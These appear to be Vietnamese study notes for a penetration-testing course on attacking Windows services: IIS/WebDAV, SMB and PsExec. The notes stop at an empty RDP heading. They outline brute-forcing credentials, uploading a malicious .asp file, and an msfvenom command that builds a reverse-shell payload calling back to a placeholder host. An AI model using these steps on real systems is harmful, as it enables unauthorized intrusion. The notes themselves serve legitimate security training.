# Windows Attacks

## Windows Vulnerabilities

Tất cả các hệ điều hành Windows đều có điểm tương đồng về mô hình phát triển.

- Ngôn ngữ lập trình C - dẫn đến tràn bộ đệm, thực thi mã tùy ý, v.v.

- Không áp dụng bất kỳ biện pháp bảo mật mặc định nào - phải được công ty xử lý một cách có hệ thống

- Bản vá của Microsoft không được thực hiện ngay lập tức hoặc các phiên bản đã hết hỗ trợ/bản vá

## Vulns Types

| Lỗ hổng (Vulnerability)         | Mô tả (Description)  |
| ------------------------------- | --------------------------------------------------- |
| **Information Disclosure**      | Cho phép kẻ tấn công truy cập vào **dữ liệu bí mật hoặc nhạy cảm**        |
| **Buffer Overflows**            | Lỗi lập trình cho phép kẻ tấn công **ghi dữ liệu vượt quá bộ đệm được cấp phát**, dẫn đến **ghi dữ liệu độc hại vào vùng nhớ khác**                         |
| **Remote Code Execution (RCE)** | Cho phép kẻ tấn công **thực thi mã từ xa** trên mục tiêu              |
| **Privilege Escalation**        | Cho phép kẻ tấn công **tăng quyền hạn** sau khi đã xâm nhập ban đầu      |
| **Denial of Service (DoS)**     | Cho phép kẻ tấn công **làm tràn tài nguyên** (CPU, RAM, mạng, ...) của mục tiêu, khiến **hệ thống ngừng hoạt động hoặc không phục vụ được người dùng khác** |


# Windows Exploitation

Windows có nhiều dịch vụ và giao thức gốc tiêu chuẩn được cấu hình hoặc không được cấu hình trên máy chủ. Khi hoạt động, chúng cung cấp cho kẻ tấn công một vectơ truy cập.

| Giao thức/Dịch vụ (Protocol/Service)                | Cổng (Ports)                                | Mục đích (Purpose)                                                                                                                          |
| --------------------------------------------------- | ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **Microsoft IIS (Internet Information Services)**   | TCP **80/443**                              | Máy chủ web của Microsoft dành cho Windows, dùng để **lưu trữ các ứng dụng web**                                                            |
| **WebDAV (Web Distributed Authoring & Versioning)** | TCP **80/443**                              | Phần mở rộng của HTTP cho phép client **sao chép, di chuyển, xóa và cập nhật tệp** trên máy chủ web – biến web server thành **file server** |
| **SMB/CIFS (Server Message Block)**                 | TCP **445** / chạy trên **NetBIOS 137–139** | Giao thức **chia sẻ tệp và thiết bị ngoại vi** giữa các máy tính trong **mạng nội bộ (LAN)**                                                |
| **RDP (Remote Desktop Protocol)**                   | TCP **3389**                                | Giao thức truy cập từ xa **dạng giao diện đồ họa (GUI)** để **xác thực và điều khiển máy Windows từ xa** (mặc định **bị tắt**)              |
| **WinRM (Windows Remote Management Protocol)**      | TCP **5986/443**                            | Dùng để **truy cập và quản lý hệ thống Windows từ xa**, cho phép **thực thi lệnh từ xa**                                                    |


## IIS WebDAV

**Microsoft IIS** (Internet Information Services) - máy chủ web mở rộng độc quyền của Microsoft được phát triển để sử dụng với Windows.

- Ports: 80 (no certificate), 443 (with SSL Certificate)

- Lưu trữ trang web và ứng dụng web

- Administrative GUI để quản lý IIS

- Các trang web tĩnh và động, được phát triển bằng ASP.NET và PHP

- Hỗ trợ file extensions: `.asp`, `.aspx`, `.config`, `.php`

**WebDAV** (Web Distributed Authoring & Versioning) - một tập hợp các phần mở rộng giao thức HTTP được người dùng sử dụng để quản lý tệp trên máy chủ web từ xa.

- Web server giống như `File server`

- Chạy trên Apache hoặc IIS - cổng 80/443

- Cần thông tin xác thực (tên người dùng và mật khẩu) để kết nối máy chủ WebDAV

### WebDAV Exploitation

1. Kiểm tra xem WebDAV có được cấu hình để chạy trên máy chủ web IIS không.

2. Tấn công bằng phương pháp `brute-force` vào máy chủ WebDAV - xác định thông tin xác thực hợp lệ.

3. Sử dụng thông tin xác thực thu được để xác thực với WebDAV và tải lên mã độc hại, như tệp tin .asp, được sử dụng để thực thi các lệnh tùy ý hoặc lấy shell ngược trên mục tiêu.

### Tool

`davtest` - được sử dụng để quét, xác thực và khai thác máy chủ WebDAV bằng cách tải lên các tệp thực thi thử nghiệm cho phép thực thi lệnh trên mục tiêu. Được cài đặt sẵn trên Kali Linux và Parrot OS.

```bash
davtest -url <URL>
```

`cadaver` - hỗ trợ tải lên, tải xuống tệp, hiển thị trên màn hình, chỉnh sửa, thao tác namespaces (move/copy), tạo và xóa bộ sưu tập, thao tác thuộc tính và khóa tài nguyên. Được cài đặt sẵn trên Kali Linux và Parrot OS.

```bash
cadaver [OPTIONS] <URL>
```

`msfvenom` - một trình tạo và mã hóa tải trọng độc lập Metasploit

```bash
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<PORT> -f <file_type> > shell.asp
```

## SMB

`SMB` (Server Message Block) - một giao thức chia sẻ tệp mạng, được sử dụng để chia sẻ tệp và thiết bị ngoại vi, trên Windows

- Ports: 445 (TCP), 139 (NetBIOS)

- Hai cấp độ xác thực để truy cập vào một share:

    - User Authentication - `username` & `password`
    - Share Authentication - `password`

`SAMBA` là Linux SMB mã nguồn mở (nó cho phép các hệ thống Windows truy cập vào các chia sẻ Linux)

### SMB Authentication

1. Yêu cầu xác thực từ máy khách đến máy chủ

2. Máy chủ yêu cầu máy khách mã hóa chuỗi bằng hàm băm của người dùng

3. Máy khách gửi chuỗi mã hóa đến máy chủ

4. Máy chủ kiểm tra giá trị chuỗi thực tế của người dùng đó có khớp với giá trị của máy khách không và cấp quyền truy cập. Nếu không khớp, quyền truy cập sẽ bị từ chối.

#### PsExec

một giải pháp thay thế telnet cho phép thực hiện các quy trình trên hệ thống từ xa, hoàn chỉnh với khả năng tương tác đầy đủ cho các ứng dụng bảng điều khiển, sử dụng thông tin đăng nhập của bất kỳ người dùng nào.

- Xác thực PsExec được thực hiện thông qua SMB

-  Chạy các lệnh tùy ý hoặc remote command prompt

- Các lệnh được gửi qua `CMD` (không có GUI như `RDP`)

- Tài khoản người dùng hợp pháp và mật khẩu/băm là cần thiết để có được quyền truy cập mục tiêu của Windows

#### PsExec Exploitation

1. Tận dụng nhiều kỹ thuật khác nhau, ví dụ như tấn công bằng cách dùng vũ lực để đăng nhập SMB.

2. Thu hẹp phạm vi tấn công chỉ còn các tài khoản người dùng Win phổ biến, ví dụ: Quản trị viên.

3. Sử dụng thông tin đăng nhập thu được để xác thực thông qua PsExec và thực thi lệnh hệ thống hoặc lấy shell ngược.


## RDP











